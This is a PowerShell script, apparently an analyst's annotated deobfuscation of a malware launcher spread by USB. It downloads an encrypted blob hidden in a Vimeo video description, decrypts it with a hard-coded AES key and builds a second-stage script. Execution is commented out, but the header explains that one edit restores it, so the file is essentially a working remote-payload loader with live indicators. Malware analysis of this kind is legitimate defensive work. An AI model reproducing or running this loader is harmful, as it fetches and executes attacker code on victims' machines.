# !!! THE SCRIPT IS EDITED TO NOT EXECUTE ANY MALICIOUS CODE AND JUST PRINT THE SECOND SCRIPT TO MAKE IT WORK YOU SHOULD REMOVE THE "#" FROM Invoke-Expression $secondstage (line 31) !!!!

#This script acts as a launcher, as far as i understand, it gets an encrypted text from a vimeo video description, trims it, decodes it and decrypts it with the maybe_description key, then generate a second script wich i called $secondsage and runs it

# assign a value to the variables
$uuid = "19138b34f96711eda6c32cfda171ad97";
$vimeo_link = "https://vimeo.com/api/v2/video/804838895.json";
$maybe_decription_key = "kvdrfWrnP0G1j0HlFPto3sjoSi3Bb6Jx8/MdnzyZt00=";
$current_path = $(get-location).Path;
$invisible_char = "ã…¤";
$invisible_folder_path = $current_path + "\" + $invisible_char + "\";


#checks whether the hidden usb path exists, if so, generates the script, else stops the script

if (Test-Path -Path $invisible_folder_path -PathType Container) {
	$vimeo_description = (new-object Net.WebClient).DownloadString($vimeo_link);
	$decoded_base64_from_vimeo = [regex]::Match($vimeo_description, "::\?\?(.*?)\?:\?:").Groups[1].Value;
	$decoded_base64_from_vimeo = $decoded_base64_from_vimeo -replace "\\", "";
	$blob_from_video = [System.Convert]::FromBase64String($decoded_base64_from_vimeo);
	$string_from_video = $blob_from_video[0..15];
	$aes_funciton = New-Object "System.Security.Cryptography.AesManaged";
	$aes_funciton.Mode = [System.Security.Cryptography.CipherMode]::CBC;
	$aes_funciton.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
	$aes_funciton.BlockSize = 128;
	$aes_funciton.KeySize = 256;
	$aes_funciton.IV = $string_from_video;
	$aes_funciton.Key = [System.Convert]::FromBase64String($maybe_decription_key);
	$decryptor = $aes_funciton.CreateDecryptor();
	$generate_script = $decryptor.TransformFinalBlock($blob_from_video, 16, $blob_from_video.Length - 16);
	$secondstage = [System.Text.Encoding]::UTF8.GetString($generate_script).Trim([char]0);
	#Invoke-Expression $secondstage;
	Write-Host $secondstage;
}